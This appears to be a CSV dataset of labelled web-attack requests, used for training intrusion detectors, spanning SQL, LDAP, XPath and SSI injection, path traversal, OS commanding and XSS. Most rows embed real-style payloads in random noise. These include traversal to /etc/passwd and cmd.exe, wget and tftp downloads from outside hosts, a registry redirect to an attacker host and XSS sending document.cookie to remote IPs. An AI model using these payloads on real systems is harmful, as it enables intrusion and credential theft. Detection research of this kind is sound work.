,id,class,vector
10634,10634,PathTransversal,si=092&peg50nRw=aMosunel\earush &tXt6ni=010&aneueaitjooh=09eae
10636,10636,XPathInjection,/@SZcX1orDkCrSRinsert/wyWRQpFPFYzv/ouflai3IeVoyotio.js?IN9VGvtelnet=4+or+++dta%2F5r%2F3e%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D369%5D++or++83%3D&fs=t%29%25uA5qnd%3Cftu0eln&LB6v_-rexecHFPE=titeutaTrlatbo&tYi7r=T%28orp&snctv7S=54355&yeh8elecypt0oHe=e3ovMlgObQ&8twr=1foec-i&88nlechohc=hlalea&ctir3uer9u=coW&jnns=txd
10637,10637,OsCommanding,"/scripts/file.bat"""
10638,10638,OsCommanding,"L@lGQldSQPT8="";  /usr/bin/wget     www.tont.com/ne;&o4eytntlsE1ae=rfrom&eh9sHai=en&XBSgssamYZJV1K=2&umUndocumentcK= f]z0dRe&igieca=3520985456&psmdona=tqih&1iociasg=fiSLiieiUUmuEf&siEx1p0teo=2021742965&vtopeoekleite=aM3olxepi sw0c"
10641,10641,SqlInjection,/iipXycF3XstNsE_06xm7/tbe1nd6cmnnlagiE2/tVMvd0/mxsuu3ehht/4ucbefEfem3u/unn/lyUJ4BzBxFTck6xHC/moRry/rDQPRIyXsh7OKOXDTD-/htts7snuatsacR/ehEXqtRpeO4@Ql4.php3?cfheo=1604&sues=8855&zhgotRurea=tfJ&oowINC56=aD%3Fbxdivs4mq%5Co&ssystem61rfIhXF=s&fptfr3k=ne+execlmu%3Cxem+vHh%3EeE&8e=oFlnesdniowl7jf&eozat8id=1051&0pnsrpxhbi=d&8egt1pa=4651333&.J0tmpIZecho1=nWNwCfOG.cuj&jyeyC=and++0%3C%3E%28select++count%28*%29+++++from++++nhG++where++++Tagrato%3C%3E%29&euh0yeQvhs6t=77094&ddho4nj=M47h4inki
10642,10642,PathTransversal,/ttlribermIujwmoOen/e0/3n/aaenwseesnAwehnhson/iFxmUbHa1R1./9oNbg9RuGaN/owCQKvtbY88R19ZJD/aa4orFmOJTrt6oldH2.tiff?ouwgetonrs=+%7C&wtS2=s%3A%5Cwinnt%5Cboot.ini&oPzp1ahi=16018609&oounM=smuyw&Cfei=opEoniEetsr
10645,10645,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
10647,10647,LdapInjection,/lIkBxKK6mQk4shc/thttprLhRj/hmr7d2oeuylj/aoyr8qs8e/xIVsNETNl5U/lhfileox/Nw0ToY7jlRSaccess_log9/ktcat_rztbL@.mdb?rceix=d&sHhsTtlghil=251&oaeIxen7ieu=tnrnstl1&5az5raeuosya=pNsi%29%28++++%7C%28tsfd%3D*%29&isW9SuhIsrNS=2ubPHBRjL4J&qhesiTLtm=rhuwsss&r2ebbwtotei4=aQTf_u0X0gUL
10657,10657,SqlInjection,/i1ntnl/.XtmpbodyaaDy5ijformF/ltoukln/hWpYPXEE/cA4MhH1L0dz/Fwsock_streame3qXzXxN61o/xdkjuanemoWcm6c/nE/d./MJKnullNPk/rltziRcshi3iRtatil6t.htm?vtuhcoNoChsmfa=ru2iframe92pan&1J4my3o=e%28egsuwothytt&ngx5eri=81262&ehN=OR++++1269804%3E39476505642
10659,10659,LdapInjection,/pk3PXhR-941R2rcp/DelioiousthmscT/raygntry1hssNe/dDEz9OKtESsWqHwUdV/auratp/ii2H/8Awtkir6titlell6tmts/dnDoeespxtieoay6w/lXRe5y.cgi?Tcfpip_Xp.9=gTwyAzE2fDp&QdG=%29++++%28%7C+++%28ahu%3D9ns*%29
10661,10661,XSS,CHQHgAKTB6document=8usm2iaaueq&0EiKgdhelnyyopa=<img+src=javascript
10664,10664,LdapInjection,/SPHmocha5/lIkmTwAjQJs_D06NG/eioa/V2hPB36iT/RnT76quares7opo0Ceae/Av5QmIqscriptMe3aO/hrtdt/lk_ZeyO0qMk/s7jD..css?9SeewLtnskle=rwhconnectkuhtpassh%25h%24g%3Bej&tvmmE0oatm7ers=wfTBK4wSf&JpUhdjscript4hd=ht&re=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&h5tbr9mt9dnoe=1TW1rqGMNm&xp_exFGQY0Fn=e7orhe0EisoIdd5&B22LGwinntNJ=T8w+x&svtoNese3syAt=609837&bl9Srenet=c
10670,10670,OsCommanding,/eKl.@N.js?evpiec=691&o2gia=acaconnect4&rEqubchsmlleht=+ssh&oiteaftsToiwre=tr&DZWAfYf.T=Ah+b8Ko3e%40i&tro=rdihat&winntcmdamailnEi9Te=ecrtwgetYi%25%7Ea6ohq&nst=44.225.165.193+++%7C++dir%2Bc%3A%5C&ni3tabplltc=f%2F+t&orsottnErct=WesjE
10677,10677,XSS,/iorrmdeInpottl/Ri/qa46lC8eHrjt8Dy/htpassZYlmwheretz/7ierlRdar5xFu9tuNUu/vw2srvintTaiyhlrdO/uerAtwtpb/9@75kyjsBuCm8Qn/sco.htm?bilehvyt=2&dhblaeeand=gidl0nSt0hdtmt&7vbscriptGJblTqk4w=mmb478jAVKJ&ltdh=m5CHMr&0oulsZ=%3Cimg+++src%3D++++%22++++javascript%3A++++%5Bwindow.open%28%27http%3A%2F%2F252.68.192.186%2Fvetoil.mdb%27%2Bdocument.cookie%29%3B%5D++++%22+++%3E&aiwSsmz4c=gLn1nsaroovscc&2eonnos=ewdegoeiRdd51loOE&rtT=i%2Fmu&eafneo1iFitDgri=t3&iioisRaea0q=%28tOa%3Dh&@Ir7-Mcmd=passthrulanl%7CMzeincludedlocationza&moaha0ilaii=lib9ams%28n%5C7d
10680,10680,PathTransversal,/h0EHBKH3LIny_0ALe-/eyiV8HiwQiKHYRhWN/ehHbno4/ltMgaSx1UlG/wgo1ootottnenatnx/Vk4trx@_H/8cO@P49MQcatN/TeAmailjv/9aseaknrwleat/o-tZc_wkDf_me./Rd5Cu/sdc9dEaeI.asmx?w9kbs=95529221&o@L_H0g5MnIq=4152&Stta=0&istlthTvni=943440&eyAo7yvaint1=0&FIwSFUS=siuM8ddrn&tshoLtitnadcb3k=857335&.kutsyAPfIpG=9getsmet&ueeoojtaatSilas=uprmtgph9a1&Odyttte=0852505&pnwTumaydsuhuwe=%3Ef%7Ezicpkvesmpo%3Asock_stream&k4uleoeSd=s3pe4iioKApM&LTbgsoundmio=..%2F..%2F..%2Ftinsve%2Fadmin.txt
10683,10683,XPathInjection,/nfM@idUzFyE_/6ePUSmhY/t2XFzU/TmPUDexec_rNeWCTyN/oaanuvv4oiel/daloRto8enseythat/y_73M1L16Oq/wbdLLgmAi.gif?ha=7hR47jexecmldb&creinwNl=Ubuub&ht5ZwqfromPv=471016&B.krEEtVocd=ema%27+or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++or++++%27ajo%27+%3D++++%27&7gei=fetcimgformh4&DraA=n225eNlCo&heebaunoKou=156240198
10687,10687,XSS,/1yB_jEMX2SNrUP/asVJkUu7-v76Vxi/rl2hqa2eicjt9eFrg/i3png/oipeeeaI4on5lb/unduececOkieq49vq1wt/o2tx/smEdakSVbzAQpHkR/qSdosF-5WaSiEfvaq7.cgi?idE0no=%3Cdiv+++++onmouseover++%3D+%22+%5Bwindow.open%28%27http%3A%2F%2F29.249.236.215%2Felngma.asp%27%2Bdocument.cookie%29%3B%5D+%22++%3E&ernteLilrs=56875&documentexecgMc=tOBjKFe.&odJanomv=5ELSsNDQS7bt
10692,10692,LdapInjection,/fz6vmpVd3/Elog3Qgpz@Q/QvH5B/cen/tuBHDQ1_rHkdrudyJ/tse/tIYmeii5ZId5/teae.png?aljtnntep7eEnh=%29++++%28++%7C+++%28displayName%3Dhad*%29++%28name%3D++had*+++%29%28++++mail%3Dhad*%29
10694,10694,PathTransversal,/iwor1nba2cooeem/rAnlandra97e.cfm?o05tse2=zettjuge&dOageatMo=50529176&kKKr=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&ivm=rHl&PnMsF-Jlvbscriptihl=646492&OEFn8Y@6Ai=orv&oeryu0id=mI.jZWV02tw2
10706,10706,PathTransversal,/rdqiraNDtus6nlnUtnbt/oandI3LO_/rioMrtumCs3trs/ndaNw30nTqcUD/rtt1dolg3stwdwaa2/rrPixKY6N/enmu9mirdca/rudd5is.css?hdlEgcq=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&MSMJgL=0j&Epntyrsgtsa5e=oixsttnT
10708,10708,SqlInjection,"uaithirrsao=aeyhtpassNn &-PGwindow.opens=943689&04gdopUw=niberya&ntaaNhdhi=hnkacmoeap&0tten0ucv8=ejtdJFap@.&soS9ueh=5ewnxp_Ie&sOguIee=exec   xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\Client\ConnectTo','OeNe','REG_SZ','DBMSSOCN,hackersip,80'&rneeTiiw=6&t1T8FsamrjXk=sIMEkFAXm8&co=854500&XzuDOvJtelnetP=:tfromuor&nmnhtmpscript=g7FTl_DcI"
10709,10709,SqlInjection,"ueeaeas=-e&pszy3ufAzG.e='  )   UNION  ALL  SELECT     sgdh     , htdtwew ,   eqasg  FROM eu WHERE    nOaicieyet NOT IN ( 'bznaocsTn'    )     AND     s6Osoohf5 NOT     IN    (    'taev8tn2rD'    )     AND   ''  =   '&P3-EtreplaceIFOU9=relieohanei91ch&L0@O1Q=eOnd1popeposition'&nc6nng=3Enr"
10715,10715,PathTransversal,/vTsjOp7wQOJHNom/oD/I5eI0/rwUd/gAadEletktR/6G9ivOnp4kcDZ3dqh/9nrwta5ygis/iWlk9GOviIRTPo.JmcfJ/Nrolte1.shtml?n2mo=rYjUku&8n=2164677&lxtfcnptsmb=658&iCapestS=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&iV7R1kXhavingpassthruZ=wyKMqc73&FFbgsoundH3xuqzrB=0ees
10716,10716,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
10720,10720,SqlInjection,0aeeH5=315605&szigomh5k=osrs7ZmoL_&yynaat3f=zrtbohXwY9orstez&tu=uV6YlPuBCZ&rktistPdpe=18474666&s5ieein5nhssr=se5strsrnbhLOi3Ui&iai=779&Myhdrowh8lifc5=dnirakeratehahy&eiteS77Sp=355&aimtnoheijsser=dcmssrxll$t0dh itmpet&dtdtvnsTyoioad=emnshc'   UNION ALL    SELECT    l10oet   FROM   us7wtmdt6m     WHERE  ''   = '&lhleaIs=lrn@o&sts42spb=tattnScdar=l[Fc\ c&bE3l0ene=1413701&2eh=h
10731,10731,SSI,/Xm0ftBYbD2ZT/tnrkIderlns5t/semnevuxtme7lrr/mjZyXeW2tAz-HMR/G2M2WZLj8tKiframeW/tQ2m/8W9_/lastdb4asUeutwcabi/hlsnife/tz/d8TzoQSa-5GqvlYq5d/erdteatSeeEle3q.nsf?odiioj3L=899664967&ope3o=tzLSbB&e5cr=yrufhviN9bn7dHs&ndolnseoeau=th%40tiellhso&nm=sy9wfUSLPp&neal=Og+&dai3i=mnrta%24o%3Ef&erswd5unt=%3C%21--%23email+fromhost%3D%22www.nurtln.com%22+tohost%3D%22mailbox.soast.com%22+message%3D%22e1mtt+yhhhrgi+m5f+siotpw%22+fromaddress%3D%225Geeb.com%22+toaddress%3D%22toc5i.Va.com%22+subject%3D%22RT%22+sender%3D%22mtne.com%22+replyto%3D%22eopreea.com%22+cc%3D%22sa%22+inreplyto%3D%22maf+teH+e%22+id%3D%22eo4nCmail%22+--%3E&alrWuljv8hsh3sl=servicest%2Bali7%3A&4ttbbn=ehkMeftreaosOnull&HJ150o1=5&tuoesar=weradlednb4k6zs1s&izrovrdguate=dmxwZCMFF
10734,10734,XSS,/i_.cfm?c9zeontWz=9&oyivnle=auwden&jrn8lt=4315&em=1&ci0Abiukcekltet=sUQLc8a%40EO&jIpttaoOfiK=%3Cdiv+style+++%3D+%22+++++width%3A++++expression%28%5Balert+++%28%27h6er9Aop%27%29%3B%5D%29%3B++%22++++%3E&2mot=dJQZpNQI5Bw&MWkGwqMYNLGs=q9ot%29r+&EemiMU0e=7de%3Bgoleralenshsgure&mk=%5Csstdint%7Et%3A&67nuEplb8n=scriptwinntIe6&g5oarrtsc=m6YnfhF4%3EeaTtl%28style&cattsn=nxkd8mtwrrupdateZ
10736,10736,OsCommanding,"/scripts/file.bat"""
10741,10741,OsCommanding,/stsApopdnts/EpA1Zn3E/hto5tdaHausM2dtbyiuo/ikH5-xUP/ejjiqrCCS3wM2wbtY.css?6lAmi=7329&s2petnnn6zSz=%25ur&C._httpsEnZksC71=Omitnnc%2Fm&edStPu=tFgeuaIz_s5D&OOesI7geo=%27%3B+tftp++++-c++++get+www.orliie.com%3A%2Flira.tar
10742,10742,OsCommanding,/kBJdivecLI/rAlReatauiTesyo/hyX0FTgBT/etTatYgP/oPU-SzJJ/npAKyBx-NyLA/5MErYgBU3-/RbDvkfc/knt1mailV_acceptaw5S/Eineheamueeo5b0lrTvr.js?xzDyj63ReOCor=isl&heed0sv=iwtte&owwgroup
10747,10747,OsCommanding,3eec4ryegKvntI=r%eio
10752,10752,LdapInjection,lsoaaEnbntc=79740988&tNqifi21ccd5p=065892&KrmLreplaceEBvarZBhttpsK=nHib)(| (s9i=*)&.Nfe=iiveesCprhecO&hsnyloteeyatd=h25mrueeyem&xIhomebXDR=8077438&gwpi7iyltjtj=9851070&eVYRDPS9ANiframe=tn5trs&ynlnnc=execE2ibt7 SE Zp
10758,10758,XPathInjection,/wsaisoaehupyfis/dkK6bb./nuU_1/itlLQntaaNtsa/esRimefrr5snv9tse/dUhzxm4KkDBrNj-0Iln.pl?th8hwttRbam=10+++or+++++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or++++8614%3D&neeteuIyofy=d4H6dNh.
10762,10762,LdapInjection,/dVL/hiptfthiEs2hy9h/oNf8/s98ddcipryynwD/eUwXgVyJ/oM1LXNuhut/qvEnYdS@p42/rujeUVqFs_Q.2q96an7/9AKgroup
10764,10764,PathTransversal,ygyfIxaeyEd=37716477&nRO=5zol<d\u&neopni=f5I5b0&Nai=ikpcasoonumOe$?&ziedsnwosbR=nIaapSt.&adPdAbZ=uynlaxcn+)r&ywTgpertoDy7f=nenetcat&adminKrRo3rEPhx_=voet6lteMro&Sq7r@T=sdV&qCainqlrleo=4:/.htaccess~
10766,10766,OsCommanding,/rnh/enqkcencnxiOtoK7yuty/BY/ay9t9Ehoe.mdb?WliHlzrhstevvoT=Hr2W%2F&is=execao+yn&nbmeta5B0H=e%3E%24iaecbCiceta+ro%3F%2F&G-UJFJ-HpassthruY=ySoDseh8ht+flocationlinkw&at4ssEwl=ja4Aahs&gytFL0SeI4=%5Cr+++xterm++++-display+++196.162.223.79%3A0.0&oufveWiutexs=cin&iTecnraoHreq3t=%5Dbht
10768,10768,XPathInjection,/uh365Yq6l/telnetEW/paed/nzLfaerwhosadt1/cmcq/a7a6o8g7/I4hoiiEooE.mspx?8apltyc=qmz%27+++++or++++6++++%3C+count%28path%2Fchild%3A%3A*%29+or++++%27fds%27+++%3D++++%27&ne77asszzpz=7ToDB6Cdd&sTl6auezwtreot=71804175&tehzoslw=act&adt=9815258728&ceje=+RL&mrfeecl=An%28Xms%24u&uu8V-KJTmOmw=tmwgceiL3la&rerco=6758&ixeforShfadmisr=763599839&pn=IunHHr03tqsFc&3eiaowoint45i=ht9+%5Ce+mb&rosit3=35945&Sgogoitire5a=8619&orv@vROUmI=srd1i%3F%7Eaceijsat7uB0
10770,10770,SSI,/5NG/aY@@@fn/zds2kZaWP/QdgHZ/nLst.bin?xs=et9&uMxV6b=aoS4gXRj8i&in=b&tcdjdirbtn=otperjde3n&iti=4094111&dueqfnr=09597&4ilneyohnl0Sdn=body&ies=no&meatdvt=aaC%3BT
10776,10776,XPathInjection,/7awaza6a5tohihobet/IobjectUuAM/5lrarnxregeRzw8R/lnag/7eh/sw3k/oBe_TK/eaianrgogEntn/dsnot6e1/pv1mhelae/ecopyboot.inipSGDB8/rcd4.jsp?tstb4de=tRoluj&odrgl5rebhw=rbt&02=rnG+%5Ddkv%25aezed&oq6at0rDaibhr=neLio5j%27+++or+count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28++i++++%2B+++j+%2B++k++++%2B++++l++++%2B++++1%29%5D+++%7C+path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++++or++++%27t2omdNpr%27%3D++++%27+++8ei8se%27++or&.sAGeHMz=odilebeC0uuFtrc
10777,10777,PathTransversal,/ffn6aBGH5r/lZZHnV2JNTo1nbfVVK/Tecbeg/e.7a_2jihzLnYn6Z/sH1C05/vvG_yOUJCGtmp0Y4.shtml?ttenicimdx=dnetmaeurite&eawRh=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Ferll%2Fri%2Fleni%2Fnsoranreas.mdb
10780,10780,XPathInjection,/eZOl-LJWE9qrgCp.bin?id7eh=szC+4open%7C+f&oUItthe=ddt6Lhi%27%5D+%7C+++P+%7C++%2F%2Fuser%5B+++++name%2Ftext%28++%29++++%3D%27f3&Ehhel=5&cd=wuzheatn&e2=a3eutleHiou9eao&f6Cooalssu0N=9876&hzfwt19ra5kgHt3=3&Gfadsoda=%5Ddint+%3D+&mtdovoo4iis=41&CcQrZW.hI.=tv7X3CP9&eaof=462580692&_edocumentXsock_streamlike7oHfG=th&CvnSXY=f&rnio2g=hopbhohawen
10784,10784,XPathInjection,/-tF60Rmdpasswd3/p_cR8V@0/b3DRM/1IyxYCRR8E/eH2W/aia5letenpwAh5erld.htm?anqrrSgrummoo5h=20766&td7=nselecto+5&oeltahCnl4d=+s+es&eaajsn6hnely=566&e9di4nsinesddAs=r%3B+systemnhshewsp3&goeis7qrfqirmae=3_RMY&IranNnhdihpmi6=%28u4cat&lh5rS=fMc6mlt7ii&RIelaex=lXJTo9xYQJ&yrXw=0229&@8Qp0zfEhLservices=abWeJ-&FKke74gnghttps7=%5BftHwrlvaao%27&ExL=sqRb&sieLptaz=aMsz3gn%27++++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+or++++%27hea%27++%3D+%27&tunonrlnt=yzta4xBHZkx2
10788,10788,PathTransversal,/eDD2RIMS5O/luy1AUc/rcLT4TQ6LCwlIK1Ix7Wj/a2ag4me/tElne/aX2edlnnowMelue/as6uYQ0xUYOWirF9R/cwM@qFDcx/bzWQ2SICuB/LoaetsaxO.png?Iec=65799166&t3=edi&scuioMisestv=irtrsr&ly=E&rDqrz3f0p=%25dbAtieTsmetagbi&egrss=.%2F..%2F.%2F..%2F
10793,10793,SSI,/ksraSesbbh/c_fy/iTd1DtxD-/Dx/sf4vi3sn.html?IfromOANOMV=%3C%21--+%23exec+++++cmd%3D%22%2Fbin%2Fls+-l+%2Fhome%2Fekhadts%2FyPis5ect%22+++++--%3E&arMecSznflTnu2a=8653
10795,10795,SSI,/ho/pFA474wS.exe?oaa7=%3C%21--%23include++virtual%3D%22c%3A%5Cwinnt%5Csystem.ini%22++++--%3E&8rwnruGeA=fJKmBmPUcngo&awnei=a+&me=dcAiuoecesmA&3adpnfefnriac7c=tLhomefroms&0c9il5weel=96730&ir4=khdfisrdymrra
10797,10797,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
10798,10798,XPathInjection,oeefaAd9eut2o=5923&sheibei=3 or   1<  i/eoiat2/ecSe0e/child::text()[position()=801]   or 731='] | /* | /foo[bar='
10803,10803,XSS,/sDDGub/rc/wJ6k/eGHS2S5@D2P16EzM/iBzaDNzAQadUhtafGdG/eprGTBgLwKUx7ON02Dy-/o6nfTretjseebhsed/oMp3F0-_Cg7.htm?oa=eeNljiurdeiOz&iheihlhecewtol=a&dfne8nnstsg=%3Ciframe++++src+%3D+%22+++vbscript%3A%5Bwindow.open%28%27http%3A%2F%2F116.56.229.70%2Fto.cfm%27%2Bdocument.cookie%29%3B%5D++++++%22++%3E&qRh2H@htpass=9&BciRhhrSuvH=aL.
10804,10804,PathTransversal,/ftpb/hRP8/ekbn8LY7ug./hlEd1uhChuxh.exe?FX02YGY_ovar=6617&rttpnf=237&Ne=fOiimt9ehtso&hal5cras=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&bAeDwiteeftnmn=68&5-uY7fPS-=%7Es&q8jle=i%292samgshutdown&onemptrhnt=48&8varaFxgO=o&RLnikbonb2qekd=jSEacNnMufM&8aT=219023&ieccoonsh=oroia3enih8gt&cdnreudphtuneo=t7nGnnenslprnv
10809,10809,XPathInjection,/aeU3P_-/rWa.php3?cfer=ketyst%2Fjyo%2FooINd%2Fchild%3A%3Anode%28%29%5B+++position%28%29%3D104%5D++%7C+++seetc%2Foot%2FrG2t%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D7%5D++++or++++%27Pu%27%3D++%27&ahtf2e=26&5indon=a%2Bo7wm&tae7ore=e0Ydddz&n2ned=svi5tva2&2snoifsoop=3
10817,10817,XPathInjection,/ir/edjIkMx@p9.WZch/PQHTGoOT@7BqA/s6hfdenbtrtlt.htm?04LNinputPDjC=42491&dmlh6rniyezieer=rotf0etyms&zhiaghn=78519&s4M=7901++++or++++62%2Fl%2Fet0%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D99%5D+++or++40%3D&iwhwchetitynEtg=rmtostdin%3C0ol+aaaew%3Fi%3E&et1r=ixTj3rnGM&alolheKb=h6c%27r2oleesm&ps7n=37&osst47s4=ao%7E&gs=63&jdysinldLsrein=hmctepe&tojenhtcram=cWHmrh&Yh9ut1Oea=seYn
10822,10822,LdapInjection,/oe5n2orssNrmm/ifERAxfcRfuaBw2UiD9/oot/e1YQP@g.exe?abh=E7r+&5OFWFI=services&scswcIrefqtY=LdNfdAbyecumv&CBXF=%29+%28+++%7C++%28displayName%3Dhad*%29+%28name++%3D+had*+%29%28+mail%3Dhad*+++%29&nni5nussis=9069016171&iTarnytdailrnp7=0&ideiseiWr=rdt+h+5a%2Fmtsroy&unrEos5=stmpon+
10824,10824,PathTransversal,/.nsf/../winnt/system.ini?
10833,10833,XPathInjection,/5y7kKTYA1mgrg2hi4vB/deleteZEPH4s/srkBjgkPJg@Y@5RV/Y_6RetcdHgNO@u/tmTAk/oNqmwsQ/vIwconnectsamnph-vp32mbp/xu6hiIyee8u/WnYc/3qdzNS9qHug.htm?bpeAe=iS%40erh%25KlogT&a4psrntonnps=9rtd%27++or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++++or+++%27od%27++%3D++++%27&naT=r6r&tepthesa=n%3Bntgx8%25phd
10837,10837,XPathInjection,/oobe/0pLxPtRqo9gsaB/n0/ejtee/ee1ntzeadehm3m4yl/m6haeeikem5ssnhiuoch/Wrx8/mwMQn1NZTv/4YIpTPM/ti/oavucYkCz/e00KZSN.aspx?6kfmocha=9426385&are=as+&7ocmogy5aZh=rs8n&hm4mHfpb6inha=qzo%40&Pfk@VperlHt2e=eochildht&usdtlbf=tnabyl8mbgtfcL3s&eihtuxl=oNReerEih&miuoe=0&nls=23239++or+++count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+++62027%3D&ZcmdhGA9un=lm%3Dca&d7lm7tksti=edur%7Enrhz%40yqe7h&D9QMnd1oJ=040411&aAi=mlTer&tt0=akhlzf6&ssb22tdnrag=1
10849,10849,XSS,/zXx_iS9sWDqNmG07kYrN/rdNoistseFhtanmc/ssuoeteooHltDhq/lA1F7X1vdczul/o5/cplnar4Brosn/_xo.php4?sea=3Ngrotphieft4g10&xt0rtee=%3Cxml+++++id%3D+++%22++++X++++%22++++%3E%3Ca+%3E%3Cb++%3E%26lt%3Bscript%3E%5Balert+%28%27oet%27%29%3B%5D%26lt%3B%2Fscript++++%3E%3B%3C%2Fb++%3E%3C%2Fa++++%3E%3C%2Fxml%3E
10853,10853,PathTransversal,/bnilfsXmcwhmuBhosOe.js?passwd-H4VY4=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&afor4ydO9i7x=Yweoyin
10856,10856,XSS,/jtRECYn2S9LtkQ-3wsox/eBY7Cql7sy8zw/rIJlWckzwrUNe.MZ4F/fnsztasIDntlrseol/n9n1/rMq7UnOiV3lXlv/s03nLF7m/so5aEFUe4oevRr.php?ot=en%25ha&b9lsqiror=%3Cstyle+type++++%3D+%22+++++text%2Fjavascript%22%3E%5Balert++++%28%27lonN%27%29%3B%5D%3C%2Fstyle+++%3E&si5r=za8gE5d..E.
10858,10858,LdapInjection,/rpb@6j0daVMBA1yXZHP_/eaow/VM/sdrutEieas/dM/7itn0easorssoeoidt5e/eQ-/6m2/LxCdivXCXlog-@JPz/unc8ubrtstgl.pl?DEsesaneob=5&rr8n4hew8nhHoFk=aE3+1&lnuea=mrIoofunxeal+ir&ooErOesOr=05624&eva0sdoonab9s=20&enande=%29%28+%7C%28displayName%3Dhad*%29+%28name+%3D+++had*++%29%28mail%3Dhad*+++%29&ozG2sxast=qS2&hs=etmtc26Hhnnicfnkrp&6esLgw=710
10859,10859,XPathInjection,/1NAM/513e7AqsfhSR_Z/ayM1QzwQ1Rrde/t@ZRgJ0a/osvtd7asDfhVefawc/lms3CXHDzMOYBh5/fijstt/Jjgz0G/nPW5qLxYMGV66EQKARl.jpeg?tElrfndyv3al=ditrro&dtvwTjgyt=780390219&cwpdrt23atieLtr=+etc%29sbdUasraa+9et&nlooihnittekSN=qr70zngd&ytSnohhsCi=i6y&Lr3=emrOnftpaOeM&pNi=ce%27+++++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++++or+++%27mnoerog%27+++%3D+++%27
10860,10860,PathTransversal,/lfD6PMP7sTxOm/Mi_Vfv1bnN/Ohsnng.jpg?aDgetle=t%3A%2F.htaccess%7E&he=dVnw0l%40fa&Ey=%7C9sA
10864,10864,SqlInjection,/QnydZIu0w/Reipn/tXvedmNq-mcLp1OX/uaetS6alBu1RtNosi8n/exG.I7hmNectrUbUMR/eqCxlMWp4/unZHP0neNla3/cab4q0nnnecebslsneOn/r95AE45/nh8aeoL/aUbUB.html?eteEioior=OR+%27aaHcno%27+%3D++%27Sim%27%2B%27ple%27
10872,10872,SqlInjection,/gtzbePlDesyf9s/jPf2QWTGlq/KXFmUaTucc/pv./nIxuYXkEqw/thn0m/wiwdEUirrpa2oa/x3/admindropXJBusr1jofBtb/FiOv/n6.css?sas4no7nE=%27++++%29+++UNION+ALL+SELECT+++2+++FROM++tcivurb+++WHERE+++%28++++%27%27+%3D+%27&io5goOo4rRsn=%3A1binsertteta+htaccesYso&WAxtermvar=rSw%40H3RK6P&2whxmlA=o%3Clocation&mg=ntke9
10873,10873,LdapInjection,/mDmN4U/1elsdXdsattcdmreApr/Esidu/lk_CnIK6_F6rA9/mail15bo1.nsf?
10884,10884,PathTransversal,/AworbxM/7v/plnnp/lzeaK@v/dzEttriostikr/tDs1p9PLdSEICoqQA9v/wn1trcd6gsrn0a/ag/qUVMrfwVofHr/iIh9aw7wdyaoaax9.jpeg?erdsWno=%2F%2C%2C%2C%2Ftice%2Ftfrih2%2Fpasswd
